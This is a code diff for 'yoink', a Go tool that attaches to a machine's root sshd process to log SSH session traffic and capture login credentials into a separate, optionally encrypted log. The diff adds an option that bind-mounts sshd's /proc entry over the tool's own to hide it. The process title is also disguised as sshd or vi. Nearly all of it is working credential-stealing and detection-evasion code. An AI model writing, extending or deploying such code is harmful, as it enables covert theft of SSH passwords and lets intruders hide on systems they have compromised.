@@ -2,10 +2,12 @@ package main
 
 import (
 	"flag"
+	"fmt"
 	"github.com/lunixbochs/gspt"
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"strings"
 
 	"./ghostrace/ghost/process"
@@ -15,15 +17,22 @@ var defaultTitle = "/usr/sbin/sshd -D"
 
 func main() {
 	fs := flag.NewFlagSet("yoink", flag.ExitOnError)
-	title := fs.String("title", defaultTitle, "set process title")
+	// logging options
 	nullIO := fs.Bool("noio", false, "skip logging IO, still can log creds")
 	logPath := fs.String("log", "", "set output log (disables stdout, will logrotate on startup: TREAD CAREFULLY)")
 	credPath := fs.String("creds", "", "copy creds to separate log (O_APPEND and can encrypt with -key. no compression or logrotate)")
 	key := fs.String("key", "", "encrypt logs with key (must be 32 hex bytes)")
 	lzw := fs.Bool("lzw", false, "compress logs")
+
+	// process setup
+	title := fs.String("title", defaultTitle, "set process title")
 	pid := fs.Int("sshd", 0, "force root sshd pid")
+	mount := fs.Bool("mount", false, "mount --bind /proc/<sshd> /proc/<our pid>")
+
+	// read logs
 	dump := fs.Bool("dump", false, "dump/decode log file(s) (default title changes to `vi`")
 	tail := fs.Bool("tail", false, "tail log file(s) (default title changes to `vi`)")
+
 	fs.Parse(os.Args[1:])
 	log.SetFlags(0)
 
@@ -127,13 +136,43 @@ func main() {
 		}
 		sshd = parentSshd[0].Pid()
 	}
+
+	// remount ourself in /proc
+	if *mount {
+		cmdArgs := []string{"mount", "--bind", fmt.Sprintf("/proc/%d", sshd), fmt.Sprintf("/proc/%d", os.Getpid())}
+		if *logPath != "" {
+			log.Printf("[+] %s", strings.Join(cmdArgs, " "))
+		}
+		logger.Printf("[+] %s", strings.Join(cmdArgs, " "))
+		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
+		if out, err := cmd.CombinedOutput(); err != nil {
+			log.Printf("[-] mount failed: %s", err)
+			log.Fatalf("[-] output: %s", string(out))
+		}
+	}
+
+	// let's go!
 	if *logPath != "" {
 		log.Printf("[+] started with pid [%d]", os.Getpid())
 	}
 	logger.Printf("[+] started with pid [%d]", os.Getpid())
 	logger.Printf("[+] attaching to root sshd at [%d]", sshd)
+
+	// trace our process
 	if err := trace(sshd, logger, credLogger); err != nil {
 		logger.Printf("[-] error during trace: %s", err)
 	}
+	// unmount
+	if *mount {
+		cmdArgs := []string{"umount", fmt.Sprintf("/proc/%d", os.Getpid())}
+		logger.Printf("[+] %s", strings.Join(cmdArgs, " "))
+		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
+		if out, err := cmd.CombinedOutput(); err != nil {
+			logger.Printf("[-] unmount failed: %s", err)
+			logger.Printf("[-] output: %s", string(out))
+		}
+	}
 	output.Close()
+	credOut.Close()
+
 }
